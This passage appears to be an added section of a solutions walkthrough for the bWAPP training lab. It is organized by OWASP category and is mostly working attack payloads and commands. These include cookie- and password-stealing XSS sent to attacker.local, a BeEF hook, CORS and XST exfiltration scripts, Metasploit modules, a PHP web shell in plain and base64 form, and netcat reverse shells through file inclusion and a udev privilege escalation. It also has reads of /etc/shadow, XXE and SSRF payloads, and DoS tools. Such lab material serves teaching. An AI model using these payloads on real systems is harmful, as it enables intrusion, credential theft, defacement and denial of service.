+Tools:
+
+	- Burp Suite
+	- OWASP Zed Attack Proxy (ZAP)
+
+
+Session Mgmt. - Administrative Portals
+--------------------------------------
+
+URL: http://bee-box.local/bWAPP/smgmt_admin_portal.php?admin=0
+
+# Security level low
+# Modify the URL: http://bee-box.local/bWAPP/smgmt_admin_portal.php?admin=1
+
+# Security level medium
+# Modify the admin cookie (value 0 > 1)
+
+# Security level high
+# Modify the admin field in the users table (value 0 >> 1)
+
+
+-------------------------------
+A3 - Cross-Site Scripting (XSS)
+-------------------------------
+
+# External Links
+
+URL: https://www.owasp.org/index.php/Testing_for_Stored_Cross_site_scripting_(OWASP-DV-002)
+URL: https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet
+URL: https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
+
+# Modify the host file on the victim!
+
+	10.0.1.51	bee-box.local
+	10.0.1.66	attacker.local
+
+
+XSS - Reflected (GET)
+---------------------
+
+URL: http://bee-box.local/bWAPP/xss_get.php
+
+# Simple pop-ups
+
+<script>alert(0);</script>
+<script>alert("MME r0cks!");</script>
+<script>alert(String.fromCharCode(77,77,69,32,114,48,99,107,115,33))</script> (http://jdstiles.com/java/cct.html)
+<script>alert(document.cookie);</script>
+
+
+# Page redirections
+
+<script>document.location="http://www.mmeit.be/en/";</script>
+<script>window.location="http://mmeit.be/en/";</script>
+
+
+# Session hijacking, cookie stealing
+
+Tool: netcat
+
+nc -l -p 80
+
+http://bee-box.local/bWAPP/xss_get.php?firstname=blah&lastname=<script>new Image().src="http://attacker.local/catch.php?cookie="%2BencodeURI(document.cookie);</script>
+
+# Cookie stealing, crafting a link
+# Use https://bitly.com/shorten/ to craft the link
+# Example: http://bee-box.local/bWAPP/xss_get.php?firstname=blah&lastname=<script>new Image().src="http://attacker.local/catch.php?cookie="%2BencodeURI(document.cookie);</script> >> http://bit.ly/1gDKCmW
+
+<a href="http://bit.ly/1gDKCmW">Click me!</a>
+<meta http-equiv="refresh" content="0; url=http://bit.ly/1gDKCmW">
+
+
+XSS - Reflected (JSON)
+----------------------
+
+URL: http://bee-box.local/bWAPP/xss_json.php
+
+';alert(0);//
+
+
+XSS - Reflected (AJAX/JSON)
+---------------------------
+
+URL: http://bee-box.local/bWAPP/xss_ajax_2-1.php
+
+# Security level low
+
+	# No JSON headers are returned
+	http://bee-box.local/bWAPP/xss_ajax_2-2.php?title=<script>alert(0)</script>
+
+	# No input validation in xss_ajax_2-2.php
+	<h1>MME r0cks!</h1>
+
+	# Dangerous JavaScript eval function
+	"}]});alert(0);//Dom Based XSS
+	<img src=x onerror=alert(0)>
+	<img src=x onerror=alert(document.cookie)>
+
+# Security level medium
+
+	# JSON headers are returned
+
+	# No input validation in xss_ajax_2-2.php
+	<h1>MME r0cks!</h1>
+
+	# Dangerous JavaScript eval function
+	"}]});alert(0);//Dom Based XSS
+	<img src=x onerror=alert(0)>
+	<img src=x onerror=alert(document.cookie)>
+
+# Security level high
+
+	# JSON headers are returned
+
+	# Input validation in xss_ajax_2-2.php
+
+	# JavaScript JSON.parse function (<> eval function) + PHP json_encode function
+
+# More info
+
+It is even possible to circumvent the JSON.parse function + PHP json_encode function!!! ( > code adjustment is needed to illustrate this...)
+
+	<img src=x onerror=alert(9)>
+	<img src=x onerror=alert("MME_r0cks!")>
+	<img src=x onerror=alert(document.cookie)>
+
+	Result: {"movies":[{"response":"<img src=x onerror=alert(\"MME\")>??? Sorry, we don't have that movie :("}]}
+
+	Conclusion: HTML entities are necessary!
+
+# External Links
+
+URL: http://paintincode.blogspot.be/2010/09/json-parsing-encoding-and-security.html
+
+
+XSS - Reflected (AJAX/XML)
+--------------------------
+
+URL: http://bee-box.local/bWAPP/xss_ajax_1-1.php
+
+http://bee-box.local/bWAPP/xss_ajax_1-2.php?title=<html xmlns='http://www.w3.org/1999/xhtml'><script>alert(0)</script></html>
+
+
+XSS - Reflected (HREF)
+----------------------
+
+URL: http://bee-box.local/bWAPP/xss_href-1.php
+
+test onmouseover=alert(0) z=
+
+
+XSS - Reflected (Login Form)
+----------------------------
+
+URL: http://bee-box.local/bWAPP/xss_login.php
+
+# SHA1 hash of blah: 5bf1fd927dfb8679496a2e6cf00cbe50c1c87145
+
+User: blah' union select 1,'admin',1,'<script>alert(0)</script>Bugged!'-- 
+Pass: blah
+
+
+XSS - Reflected (PHP_SELF)
+--------------------------
+
+URL: http://bee-box.local/bWAPP/xss_php_self.php
+
+http://bee-box.local/bWAPP/xss_php_self.php/"><script>alert(0);</script>
+
+
+XSS - Stored (Blog)
+-------------------
+
+URL: http://bee-box.local/bWAPP/xss_stored_1.php
+
+# Password grabbing
+
+Tool: netcat
+
+nc -l -p 80
+
+<script>alert("We need your password!");password=prompt("Enter password...","");document.location="http://attacker.local/catch.php?password="+encodeURI(password);</script>
+<script>alert("We need your password!");password=prompt("Enter password...","");document.location="http://attacker.local/catch.php?password="%2BencodeURI(password);</script>
+
+
+# Session hijacking, cookie stealing
+
+Tool: netcat
+
+nc -l -p 80
+
+<script>new Image().src="http://attacker.local/catch.php?cookie="+encodeURI(document.cookie);</script>
+<script>new Image().src="http://attacker.local/catch.php?cookie="%2BencodeURI(document.cookie);</script>
+
+
+# Stealing the secret
+
+Tool: netcat
+
+nc -l -p 666
+
+<script src="http://10.0.1.51/evil/xss_steal_secret.js"></script>
+
+# Content of xss_steal_secret.js
+
+	var xmlhttp;	
+	// Code for IE7+, Firefox, Chrome, Opera, Safari
+	if (window.XMLHttpRequest)
+	{
+		xmlhttp=new XMLHttpRequest();
+	}
+	// Code for IE6, IE5	
+	else
+	{ 
+		xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
+	}	
+	xmlhttp.onreadystatechange=function()
+	{	
+		if (xmlhttp.readyState==4 && xmlhttp.status==200)
+		{		
+			xmlResp=xmlhttp.responseText;
+			// document.getElementById("response").innerHTML=xmlResp
+			alert(xmlResp);
+			document.location="http://attacker.local:666/grab.cgi?"+xmlResp;
+		}
+	}
+	xmlhttp.open("GET","http://bee-box.local/bWAPP/secret.php",true);
+	// xmlhttp.withCredentials = true;
+	xmlhttp.send();
+
+
+# Exploitation
+
+Tool: BeEF
+
+# Kali Linux
+
+apt-get update
+apt-get install beef-xss
+cd /usr/share/beef-xss
+./beef
+
+# BackTrack
+
+cd /pentest/web/beef
+(gedit config.yaml &)
+beef_launch.sh
+
+BeEF injection: <script src="http://attacker.local:3000/hook.js"></script>
+BeEF control panel: http://attacker.local:3000/ui/panel
+BeEF credentials: beef/beef
+
+# External Links
+
+URL: http://beefproject.com/
+URL: https://github.com/beefproject/beef/wiki
+
+
+Other
+-----
+
+URL: http://bee-box.local/bWAPP/test.php
+
+http://bee-box.local/bWAPP/test.php?<script>alert(document.cookie);</script>
+
+
+--------------------------------------
+A4 - Insecure Direct Object References 
+--------------------------------------
+
+Tools:
+
+	- Acunetix WVS (HTTP Sniffer)
+	- OWASP ZAP
+	- Tamper Data (Firefox add-on)
+
+
+Insecure Direct Object References (Change Secret)
+-------------------------------------------------
+
+URL: http://bee-box.local/bWAPP/insecure_direct_object_ref_1.php
+
+# Another user's secret can be modified
+# Modify the hidden form field: login (POST)
+
+
+Insecure Direct Object References (Reset Secret)
+-------------------------------------------------
+
+URL: http://bee-box.local/bWAPP/insecure_direct_object_ref_3.php
+
+# Another user's secret can be reset
+# Modify the XML field: login
+# It's also possible to change the secret! (<> reset)
+
+<reset><login>bee</login><secret>Any bugs?</secret></reset>
+
+
+Insecure Direct Object References (Order Tickets)
+-------------------------------------------------
+
+URL: http://bee-box.local/bWAPP/insecure_direct_object_ref_2.php
+
+# The price of a ticket can be modified, normal price = 15 EUR
+# Modify the form field: ticket_price (POST)
+
+
+------------------------------
+A5 - Security Misconfiguration
+------------------------------
+
+# Apache, PHP, OpenSSL, mod_ssl are outdated (bee-box)
+
+Tools: 
+
+	- Nikto
+	- nmap
+	- Wappalyzer (Firefox add-on)
+
+
+Arbitrary File Access (Samba)
+-----------------------------
+
+URL: http://bee-box.local/bWAPP/sm_samba.php
+
+# The Samba server has an arbitrary file access flaw (bee-box only)
+
+Tool: Metasploit
+
+msfconsole
+
+use auxiliary/admin/smb/samba_symlink_traversal
+set RHOST bee-box.local
+set SMBSHARE tmp
+exploit
+
+\\bee-box.local\tmp\rootfs\
+
+# Browse to a writable directory and upload a PHP web shell
+
+echo "Bugged!" > /var/www/bWAPP/documents/bee_samba.htm
+
+Defacement: http://bee-box.local/bWAPP/documents/bee_samba.htm
+
+
+Cross-Domain Policy File (Flash)
+--------------------------------
+
+URL: http://bee-box.local/bWAPP/sm_cross_domain_policy.php
+
+# Modify the host file on the victim!
+# 10.0.1.51	bee-box.local
+# 10.0.1.51	attacker.local
+
+# Steal the secret: http://bee-box.local/bWAPP/secret.php
+# Attacker URL: http://attacker.local/evil/xdx.php
+# Check the log file: http://attacker.local/evil/xdx.log
+
+# Optional (if you want to customize the URLs)
+# Use the Flash ActionScript file: xdx.as
+# Compile the Flash ActionScript file using Apache Flex SDK: mxmlc xdx.as
+
+# External Links
+
+URL: http://gursevkalra.blogspot.fr/2013/08/bypassing-same-origin-policy-with-flash.html
+
+
+Cross-Origin Resource Sharing (AJAX)
+------------------------------------
+
+URL: http://bee-box.local/bWAPP/sm_cors.php
+
+# Modify the host file on the victim!
+# 10.0.1.51	bee-box.local
+# 10.0.1.66	attacker.local
+
+# Start a web server with Python
+
+cd /root
+python -m SimpleHTTPServer 80
+
+# Start a listener on port 666
+
+Tool: netcat
+
+nc -l -p 666
+
+# Steal the secrets using an AJAX request from a malicious site
+# Attacker URL: http://attacker.local/attack-cors.htm
+
+# Security level low
+# http://bee-box.local/bWAPP/secret-cors-1.php
+# Resource sharing is allowed, with no access control. Requests are allowed from every domain (*).
+
+# Security level medium
+# http://bee-box.local/bWAPP/secret-cors-2.php
+# Resource sharing is allowed, access control is set. Only requests from intranet.bee-box.local are allowed.
+# An attacker can steal the secret directly from the site:
+# curl -H "Origin: http://intranet.bee-box.local" --verbose http://bee-box.local/bWAPP/secret-cors-2.php
+
+# Security level high
+# http://bee-box.local/bWAPP/secret-cors-3.php
+# Resource sharing is not set, but requests are allowed when you add the attacker's site to the local intranet zone (IE).
+
+# Content of the malicious site (attack-cors.htm):
+
+	<!DOCTYPE html>
+	<html>
+
+	<head>
+
+	</head>
+
+	<body>
+
+	<script type="text/javascript">
+
+	function SendGET()
+	{
+
+		var xmlhttp;	
+		// Code for IE7+, Firefox, Chrome, Opera, Safari
+		if (window.XMLHttpRequest)
+		{
+			xmlhttp=new XMLHttpRequest();
+		}
+		// Code for IE6, IE5	
+		else
+		{ 
+			xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
+		}	
+		xmlhttp.onreadystatechange=function()
+		{	
+			if (xmlhttp.readyState==4 && xmlhttp.status==200)
+			{		
+				xmlResp=xmlhttp.responseText;
+				document.getElementById("response").innerHTML=xmlResp
+				alert(xmlResp);
+				document.location="http://attacker.local:666/grab.cgi?"+xmlResp;
+			}
+		}
+		xmlhttp.open("GET","http://bee-box.local/bWAPP/secret-cors-1.php",true);
+		xmlhttp.send();
+
+	}
+
+	</script>
+
+	<input type="button" OnClick="SendGET();" value="Attack CORS!">
+
+	<p><div id="response"></div></p>
+
+	</body>
+
+	</html>
+
+
+Cross-Site Tracing (XST)
+------------------------
+
+URL: http://bee-box.local/bWAPP/sm_xst.php
+
+# The HTTP TRACE method is enabled: the web server is vulnerable to XST
+# Cookie stealing is possible using XST, even if the HTTPOnly flag is set
+# Tested succesfully on a Windows Server 2003 with IE 6.0
+# Modern browsers are not vulnerable
+
+# Modify the host file on the victim!
+# 10.0.1.51	bee-box.local
+# 10.0.1.66	attacker.local
+
+Tool: netcat
+
+nc -l -p 666
+
+http://bee-box.local/bWAPP/xss_stored_1.php
+
+<script src="http://10.0.1.51/evil/xst.js"></script>
+
+# Content of xst.js
+	
+	var xmlhttp;	
+	// Code for IE7+, Firefox, Chrome, Opera, Safari
+	if (window.XMLHttpRequest)
+	{
+		xmlhttp=new XMLHttpRequest();
+	}
+	// Code for IE6, IE5	
+	else
+	{ 
+		xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
+	}	
+	xmlhttp.onreadystatechange=function()
+	{	
+		if (xmlhttp.readyState==4 && xmlhttp.status==200)
+		{		
+			xmlResp=xmlhttp.responseText;
+			// document.getElementById("response").innerHTML=xmlResp
+			alert(xmlResp);
+			document.location="http://attacker.local:666/grab.cgi?"+xmlResp;
+		}
+	}
+	xmlhttp.open("TRACE","http://bee-box.local/bWAPP/",true);
+	// xmlhttp.withCredentials = true;
+	xmlhttp.send();
+
+# External Links
+
+URL: https://www.owasp.org/index.php/Cross_Site_Tracing
+URL: http://www.linuxforu.com/2010/12/securing-apache-part-4-xst-xshm/
+
+
+Denial-of-Service (Slow HTTP DoS)
+---------------------------------
+
+URL: http://bee-box.local/bWAPP/sm_dos_1.php
+
+Tool: torshammer
+
+cd /root/DoS/torshammer/
+python torshammer.py -t bee-box.local -r 256
+
+# External Links
+ 
+URL: http://motoma.io/pyloris/
+
+
+Denial-of-Service (XML Bomb)
+----------------------------
+
+URL: http://bee-box.local/bWAPP/sm_dos_2.php
+
+# The Billion Laughs Denial-of�Service (DoS) attack consists of defining 10 entities, each defined as consisting of 10 of the previous entity, with the document consisting of a single instance of the largest entity, which expands to one billion copies of the first entity.
+# URL: http://en.wikipedia.org/wiki/Billion_laughs
+# URL: http://msdn.microsoft.com/en-us/magazine/ee335713.aspx
+
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE lolz [
+ <!ENTITY lol "lol">
+ <!ELEMENT login (#PCDATA)>
+ <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+ <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
+ <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+ <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
+ <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
+ <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
+ <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
+ <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
+ <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
+]>
+<reset><login>&lol9;</login><secret>blah</secret></reset>
+
+
+Insecure DistCC Configuration
+-----------------------------
+
+# DistCC Daemon Command Execution (bee-box only)
+
+Tool: Metasploit
+
+msfconsole
+
+use exploit/unix/misc/distcc_exec
+set RHOST bee-box.local
+exploit
+
+# External Links
+
+https://www.rapid7.com/db/modules/exploit/unix/misc/distcc_exec
+
+
+Insecure FTP Configuration
+--------------------------
+
+URL: http://bee-box.local/bWAPP/sm_ftp.php
+
+# The FTP anonymous user has write permissions in the documents directory (bee-box only)
+
+Tool: FTP client
+
+ftp bee-box.local
+user anonymous
+pass blah
+
+# Upload a PHP web shell in the documents directory
+
+echo "Bugged!" > /var/www/bWAPP/documents/bee_ftp.htm
+
+Defacement: http://bee-box.local/bWAPP/documents/bee_ftp.htm
+
+
+Insecure NTP Configuration
+--------------------------
+
+# The NTP server is vulnerable to NTP DoS reflection attacks (bee-box only)
+
+# Detection
+
+ntpq -c rv bee-box.local
+ntpdc -c sysinfo bee-box.local
+ntpdc -n -c monlist bee-box.local
+nmap -sU -p 123 --script=ntp-monlist bee-box.local
+
+# External Links
+
+https://cert.litnet.lt/en/docs/ntp-distributed-reflection-dos-attacks
+
+
+Insecure SNMP Configuration
+---------------------------
+
+URL: http://bee-box.local/bWAPP/sm_snmp.php
+
+# The SNMP daemon has weak community strings: public/private (bee-box only)
+
+Tool: snmpcheck
+
+snmpcheck -t bee-box.local -c public
+snmpcheck -t bee-box.local -c private -w
+
+
+Insecure VNC Configuration
+--------------------------
+
+# The VNC server has a weak password (password == password) (bee-box only)
+
+Tool: VNC Viewer
+
+bee-box.local:5901
+
+
+Insecure WebDAV Configuration
+-----------------------------
+
+URL: http://bee-box.local/bWAPP/sm_webdav.php
+
+# The webdav folder has read/write permissions (non-authenticated) (bee-box only)
+
+Tool: WebDAV client (net use/explorer)
+
+net use X: http://bee-box.local/webdav
+
+# Upload a PHP web shell in the documents directory
+
+echo "Bugged!" > /var/www/bWAPP/documents/bee_dav.htm
+
+Defacement: http://bee-box.local/bWAPP/documents/bee_dav.htm
+
+
+Local Privilege Escalation (sendpage)
+-------------------------------------
+
+URL: http://bee-box.local/bWAPP/sm_local_priv_esc_1.php
+
+# The exploit files are included in the evil directory on the bee-box
+
+# Download the 3 files from the attacker's machine to the bee-box (once compromised, ex. using the PHP CGI Remote Code Execution vulnerability)
+
+wget http://10.0.1.66/cve-2009-2692.sh
+wget http://10.0.1.66/pwnkernel.c
+wget http://10.0.1.66/exploit.c
+
+# Execute cve-2009-2692.sh
+
+sh cve-2009-2692.sh
+
+
+Local Privilege Escalation (udev)
+---------------------------------
+
+URL: http://bee-box.local/bWAPP/sm_local_priv_esc_2.php
+
+# udev before 1.4.1 does not verify whether a NETLINK message originates from kernel space, which allows local users to gain privileges by sending a NETLINK message from user space (bee-box only)
+
+
+(1) This attack uses an external exploit, cve-2009-1185.c
+
+# Start a netcat listener on the attacker's machine
+
+nc -l -p 666
+
+
+# From an existing shell (sqli, commandi, rfi, file upload,...)
+
+whoami
+uname -a
+python -c 'import pty;pty.spawn("/bin/bash")'
+ps -aux | grep udev
+cd /tmp
+wget http://10.0.1.51/evil/cve-2009-1185.c
+
+gcc cve-2009-1185.c -o udev
+
+echo '#!/bin/bash' > run
+echo "nc 10.0.1.66 666 -e /bin/bash" >> run
+# or echo "php -r \"include '/var/www/bWAPP/images/bee-shell.php';\"" >> run
+ls -l
+cat run
+
+[./udev "PID-1"]
+./udev 2871
+
+ls
+python -c 'import pty;pty.spawn("/bin/bash")'
+whoami
+cat /etc/shadow
+
+# You could use John to crack the password files...
+
+
+(2) This attack uses a Metasploit exploit
+
+# From an existing Metasploit session
+
+CTRL+Z
+use exploit/linux/local/udev_netlink
+show targets
+set TARGET 0
+set SESSION [number of the existing session]
+exploit
+
+python -c 'import pty;pty.spawn("/bin/bash")'
+whoami
+
+
+----------------------------
+A6 - Sensitive Data Exposure
+----------------------------
+
+HTML5 Web Storage (Secret)
+--------------------------
+
+URL: http://bee-box.local/bWAPP/insecure_crypt_storage_1.php
+
+# Use Firebug to check the HTML storage
+localStorage
+
+# Go to http://bee-box.local/bWAPP/htmli_stored.php
+
+<script>try{var result = "";var l = window.localStorage;for(i=0;i<l.length;i++){var lkey = l.key(i);result += lkey + "=" + l.getItem(lkey) + ";";};alert(result);}catch(error){alert(error.message);}</script>
+
+
+--------------------------------------------
+A7 - Missing Functional Level Access Control
+--------------------------------------------
+
+Directory Traversal - Directories
+---------------------------------
+
+URL: http://bee-box.local/bWAPP/directory_traversal_2.php?directory=documents
+
+http://bee-box.local/bWAPP/directory_traversal_2.php?directory=.
+
+http://bee-box.local/bWAPP/directory_traversal_2.php?directory=passwords
+
+http://bee-box.local/bWAPP/directory_traversal_2.php?directory=../
+http://bee-box.local/bWAPP/directory_traversal_2.php?directory=../../
+http://bee-box.local/bWAPP/directory_traversal_2.php?directory=../../../
+
+
+Directory Traversal - Files
+---------------------------
+
+URL: http://bee-box.local/bWAPP/directory_traversal_1.php?page=message.txt
+
+http://bee-box.local/bWAPP/directory_traversal_1.php?page=config.inc.php
+http://bee-box.local/bWAPP/directory_traversal_1.php?page=../../../etc/passwd
+
+http://bee-box.local/bWAPP/directory_traversal_1.php?page=passwords/heroes.xml
+
+
+Host Header Attack (Cache Poisoning)
+------------------------------------
+
+URL: http://bee-box.local/bWAPP/hostheader_1.php
+
+curl --verbose --header "Host: attacker.local" "http://bee-box.local/bWAPP/hostheader_1.php"
+
+# External Links
+
+http://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html
+
+
+Host Header Attack (Reset Poisoning)
+------------------------------------
+
+URL: http://bee-box.local/bWAPP/hostheader_2.php
+
+curl --verbose --header "Host: attacker.local" --data "email=bill%40microsoft.com&action=reset" "http://bee-box.local/bWAPP/hostheader_2.php"
+
+# External Links
+
+http://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html
+
+
+Remote & Local File Inclusion
+-----------------------------
+
+URL: http://bee-box.local/bWAPP/rlfi.php
+
+# Local File Inclusion
+
+# Sensitive file disclosure
+
+http://bee-box.local/bWAPP/rlfi.php?language=../../../etc/passwd
+
+
+# There are some possibilities to deface the website or to acquire shell access through LFI
+
+1. TXT-file
+
+1.1 Go to http://bee-box.local/bWAPP/insecure_crypt_storage_2.php
+
+1.2 Enter: <?php echo "<script>alert(\"Bugged!\")</script>";system($_GET["cmd"]);?>
+
+1.3 http://bee-box.local/bWAPP/rlfi.php?cmd=echo "Bugged!" > /var/www/bWAPP/documents/bee_lfi.htm&language=passwords/accounts.txt
+
+Defacement: http://bee-box.local/bWAPP/documents/bee_lfi.htm
+
+
+2. Forgotten Function (/var/mail/www-data & RFC2606 reserved domains)
+
+2.1 Create a new user with the domain name 'example.com' (ex. evil_bee@example.com)
+
+2.2 Login with this new user
+
+2.3 Go to http://bee-box.local/bWAPP/xss_stored_3.php to change the secret
+
+2.4 Enter: <?php echo "<script>alert(\"Bugged!\")</script>";system($_GET["cmd"]);?>
+
+2.5 Go to http://bee-box.local/bWAPP/ba_forgotten.php 
+
+2.6 Change the security level to medium
+
+2.7 Enter the e-mail address of the new user (ex. evil_bee@example.com)
+
+2.8 On the attacker's machine: nc -l -p 666
+
+2.9 http://bee-box.local/bWAPP/rlfi.php?cmd=nc 10.0.1.66 666 -e /bin/bash&language=/var/mail/www-data%00
+
+
+3. Mail Header Injection (/var/mail/www-data & RFC2606 reserved domains)
+
+3.1 Go to http://bee-box.local/bWAPP/maili.php
+
+3.2 Fill in the form, modify the HTTP request using an intercepting proxy like ZAP
+
+	name: Maya the Bee
+	email: maya@bee-box.local%0d%0acc: willy@example.com
+	remarks: <?php echo "<script>alert(\"Bugged!\")</script>";system($_GET["cmd"]);?>
+
+3.3 On the attacker's machine: nc -l -p 666
+
+3.4 http://bee-box.local/bWAPP/rlfi.php?cmd=nc 10.0.1.66 666 -e /bin/bash&language=/var/mail/www-data
+
+# External Links
+
+http://binholic.blogspot.be/2013/12/lfi-exploitation-basics-code-execution.html
+
+
+# Remote File Inclusion
+
+# This attack uses a remote file on an attacker's machine
+
+# Start a web server with Python on the attacker's machine
+
+cd /root
+python -m SimpleHTTPServer
+
+http://bee-box.local/bWAPP/rlfi.php?language=http://10.0.1.66:8000/exploits/rfi.txt
+http://bee-box.local/bWAPP/rlfi.php?cmd=cat /etc/passwd&language=http://10.0.1.66:8000/exploits/rfi.txt
+http://bee-box.local/bWAPP/rlfi.php?cmd=echo "Bugged!" > /var/www/bWAPP/documents/bee_rfi.htm&language=http://10.0.1.66:8000/exploits/rfi.txt
+
+Defacement: http://bee-box.local/bWAPP/documents/bee_rfi.htm
+
+
+# This attack uses the rfi.txt file in the evil directory on the bee-box
+
+# Security level low
+
+http://bee-box.local/bWAPP/rlfi.php?cmd=ls&language=http://10.0.1.51/evil/rfi.txt
+http://bee-box.local/bWAPP/rlfi.php?cmd=cat /etc/passwd&language=http://10.0.1.51/evil/rfi.txt
+http://bee-box.local/bWAPP/rlfi.php?cmd=echo "Bugged!" > /var/www/bWAPP/documents/bee_rfi.htm&language=http://10.0.1.51/evil/rfi.txt
+
+# Security level medium
+
+http://bee-box.local/bWAPP/rlfi.php?cmd=ls&language=http://10.0.1.51/evil/rfi.txt%00
+
+Defacement: http://bee-box.local/bWAPP/documents/bee_rfi.htm
+
+
+# Remote File Inclusion, this attack uses a data stream, encoded with base64
+# Since PHP 5.2, if allow_url_include is enabled we can use a data stream (rather than a remote file) to include executable PHP code
+# Can be used to bypass a firewall, restricting outbound connections to an attacker's web server!
+
+1) PHP script		: <?php system($_REQUEST['cmd']);?>
+2) Base64 encoded 	: PD9waHAgc3lzdGVtKCRfUkVRVUVTVFsnY21kJ10pOz8+
+3) URL encoded		: PD9waHAgc3lzdGVtKCRfUkVRVUVTVFsnY21kJ10pOz8%2B
+
+http://bee-box.local/bWAPP/rlfi.php?cmd=ls&language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfUkVRVUVTVFsnY21kJ10pOz8%2B
+
+
+Restrict Device Access
+----------------------
+
+URL: http://bee-box.local/bWAPP/restrict_device_access.php
+
+# This page is only accessible for smartphones and tablets (Apple/Android)
+# Change the browser's user agent: iPhone - iPad - iPod - Android
+
+Tool: User Agent Switcher (Firefox add-on)
+
+
+Server Side Request Forgery (SSRF)
+----------------------------------
+
+URL: http://bee-box.local/bWAPP/ssrf.php
+
+# Server Side Request Forgery, or SSRF, is all about bypassing access controls such as firewalls
+# Use bWAPP as a proxy to:
+
+1. Port scan hosts on the internal network using RFI
+
+http://bee-box.local/bWAPP/rlfi.php?ip=[internal]&language=http://10.0.1.51/evil/ssrf.txt
+
+
+2. Access resources on the internal network using XXE
+
+# Displays the SSH banner (try multiple times...)
+
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE root [
+ <!ENTITY bWAPP SYSTEM "http://localhost:22">
+]>
+<reset><login>&bWAPP;</login><secret>blah</secret></reset>
+
+
+# Accesses a file on the internal network (1)
+
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE root [
+ <!ENTITY bWAPP SYSTEM "http://localhost/bWAPP/robots.txt">
+]>
+<reset><login>&bWAPP;</login><secret>blah</secret></reset>
+
+
+# Accesses a file on the internal network (2)
+# Web pages returns some characters that break the XML schema > use the PHP base64 encoder filter to return an XML schema friendly version of the page!
+
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE root [
+ <!ENTITY bWAPP SYSTEM "php://filter/read=convert.base64-encode/resource=http://localhost/bWAPP/passwords/heroes.xml">
+]>
+<reset><login>&bWAPP;</login><secret>blah</secret></reset>
+
+
+3. Crash my Samsung SmartTV (CVE-2013-4890) using XXE ;)
+
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE root [
+ <!ENTITY bWAPP SYSTEM "http://[IP]:5600/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA">
+]>
+<reset><login>&bWAPP;</login><secret>blah</secret></reset>
+
+
+XML External Entity Attacks (XXE)
+---------------------------------
+
+URL: http://bee-box.local/bWAPP/xxe-1.php
+
+# Security level low
+
+# Linux/Unix
+
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE root [
+ <!ENTITY bWAPP SYSTEM "file:///etc/passwd">
+]>
+<reset><login>&bWAPP;</login><secret>blah</secret></reset>
+
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE root [
+ <!ENTITY bWAPP SYSTEM "file:///etc/passwd">
+]>
+<reset><login>bee</login><secret>&bWAPP;</secret></reset>
+
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE root [
+ <!ENTITY bWAPP SYSTEM "http://localhost:22">
+]>
+<reset><login>&bWAPP;</login><secret>blah</secret></reset>
+
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE root [
+ <!ENTITY bWAPP SYSTEM "http://localhost/bWAPP/robots.txt">
+]>
+<reset><login>&bWAPP;</login><secret>blah</secret></reset>
+
+
+# Windows
+
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE root [
+ <!ENTITY bWAPP SYSTEM "file:///c:/windows/win.ini">
+]>
+<reset><login>&bWAPP;</login><secret>blah</secret></reset>
+
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE root [
+ <!ENTITY bWAPP SYSTEM "file:///c:/windows/win.ini">
